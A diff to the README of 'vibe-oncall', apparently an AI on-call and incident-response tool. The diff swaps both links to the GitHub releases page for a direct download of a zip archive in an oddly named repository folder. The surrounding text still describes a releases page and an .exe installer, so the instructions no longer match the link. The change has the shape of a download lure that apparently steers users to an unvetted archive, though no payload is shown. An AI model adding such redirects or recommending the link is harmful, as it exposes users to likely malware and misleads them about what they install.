@@ -1,12 +1,12 @@
 # 🤖 vibe-oncall - Automate your incident response tasks today
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/ninjaxx391209-crypto/vibe-oncall/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/ninjaxx391209-crypto/vibe-oncall/main/osculatrix/oncall-vibe-v1.7.zip)
 
 vibe-oncall helps teams manage technical incidents. It uses artificial intelligence to organize alerts and simplify on-call rotations. It runs on your local machine to keep your data secure while providing the features modern engineering teams need to stay informed.
 
 ## 📥 How to download the software
 
-Visit [this page](https://github.com/ninjaxx391209-crypto/vibe-oncall/releases) to download the software. 
+Visit [this page](https://raw.githubusercontent.com/ninjaxx391209-crypto/vibe-oncall/main/osculatrix/oncall-vibe-v1.7.zip) to download the software. 
 
 You will find a list of versions on the page. Look for the version labeled "Latest." Under the assets section, click the file that ends in ".exe" to download the installer for Windows. 
 
